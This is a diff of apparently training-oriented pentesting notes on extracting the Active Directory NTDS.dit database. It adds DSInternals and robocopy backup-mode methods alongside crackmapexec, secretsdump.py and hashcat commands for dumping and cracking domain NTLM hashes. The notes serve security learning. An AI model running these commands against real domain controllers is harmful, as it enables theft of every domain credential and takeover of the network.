@@ -10,7 +10,7 @@ tags:
 
 By default, the NTDS file (NTDS.dit) is located in `%SystemRoot%\NTDS\Ntds.dit` of a domain controller. The .dit stands for directory information tree. 
 
-## Alternative #1
+## Alternative #1: vssadmin (locally)
 
 **1.** Connecting to a DC with Evil-WinRM
 
@@ -86,7 +86,7 @@ python ~/tools/impacket/examples/secretsdump.py -ntds ~/borrar/NTDS.dit  -system
 ```
 
 
-## Alternative #2 
+## Alternative #2: crackmapexec (remotely)
 
 ```shell-session
 crackmapexec smb $ip -u $username -p $password --ntds
@@ -100,7 +100,57 @@ Cracking a Single Hash with Hashcat
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
 
+
+## Alternative #3:  `DSInternals` module (locally)
+
+The [DSInternals Framework](https://www.nuget.org/profiles/DSInternals) exposes several internal features of _Active Directory_ and can be used from any .NET application.
+
+#### Installation
+
+Since PowerShell 5, you can install the DSInternals module directly from the official [PowerShell Gallery](https://www.powershellgallery.com/packages/DSInternals/) by running the following command:
+
+```powershell
+Install-Module DSInternals -Force
+```
+
+The DSInternals PowerShell Module can also be installed using the official [Chocolatey package](https://chocolatey.org/packages/dsinternals-psmodule) by executing the following Chocolatey command:
+
+```powershell
+choco install dsinternals-psmodule --confirm
+```
+
+This package is self-contained and it will also install all dependencies. 
+
+#### Commands to Extract the NTDS file + Boot Key 
+
+```powershell
+Import-Module .\DSInternals.psd1
+# Extract the Boot Key from the SYSTEM Hive 
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+
+# Extract NTLM Hashes for a Specific Account
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
+
+
+## Alternative #4: Robocopy (locally)
+
+The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more.
+
+Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory.
+
+```cmd-session
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+# -/B → Runs the copy operation in Backup mode, allowing the command to bypass file access restrictions (even for files locked by the system).
+# E:\Windows\NTDS → The source folder, which in this case is the Active Directory (AD) database directory on a Windows Domain Controller.
+# .\ntds → The destination folder (a local folder named ntds in the current directory).
+# ntds.dit → The specific file being copied, which is the Active Directory database.
+```
+
+
 ## Cracking ntds file
+
+### secretsdump.py
 
 We will need either the SYSTEM hive or bootkey:
 
@@ -109,4 +159,3 @@ python3 /opt/impacket/examples/secretsdump.py -ntds ~/borrar/ntds.dit -system ~/
 
 python3 /opt/impacket/examples/secretsdump.py -ntds ~/borrar/ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
 ```
-
